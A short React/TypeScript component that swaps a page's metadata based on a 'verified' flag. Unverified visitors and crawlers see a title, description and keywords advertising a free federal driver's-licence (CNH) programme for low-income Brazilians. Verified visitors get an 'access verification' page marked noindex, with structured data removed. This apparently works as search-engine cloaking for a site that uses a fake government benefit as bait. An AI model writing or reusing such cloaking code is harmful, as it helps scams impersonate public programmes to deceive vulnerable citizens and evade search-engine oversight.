import { useEffect } from "react";

interface DynamicHeadProps {
  verified: boolean;
}

const DynamicHead = ({ verified }: DynamicHeadProps) => {
  useEffect(() => {
    if (!verified) {
      document.title = "Habilitação Gratuita 2026 - Programa Nacional CNH Sem Custos";
      setMeta("description", "Saiba como conseguir sua carteira de motorista gratuitamente pelo programa federal. Inscrições abertas para cidadãos de baixa renda cadastrados no CadÚnico em todos os estados.");
      setMeta("keywords", "habilitação gratuita 2026, CNH sem custos programa federal, carteira de motorista gratuita Brasil, inscrição CNH popular, como conseguir habilitação grátis, programa nacional habilitação, CNH CadÚnico baixa renda, tirar carta de graça, habilitação social governo, CNH isenta taxas 2026");
      removeMeta("robots");
    } else {
      document.title = "Verificação de Acesso";
      removeMeta("description");
      removeMeta("keywords");
      setMeta("robots", "noindex, nofollow");

      // Remove JSON-LD if exists
      const existing = document.getElementById("jsonld-cnhsocial");
      if (existing) existing.remove();
    }
  }, [verified]);

  return null;
};

function setMeta(name: string, content: string) {
  let el = document.querySelector(`meta[name="${name}"]`);
  if (!el) {
    el = document.createElement("meta");
    el.setAttribute("name", name);
    document.head.appendChild(el);
  }
  el.setAttribute("content", content);
}

function removeMeta(name: string) {
  const el = document.querySelector(`meta[name="${name}"]`);
  if (el) el.remove();
}

export default DynamicHead;
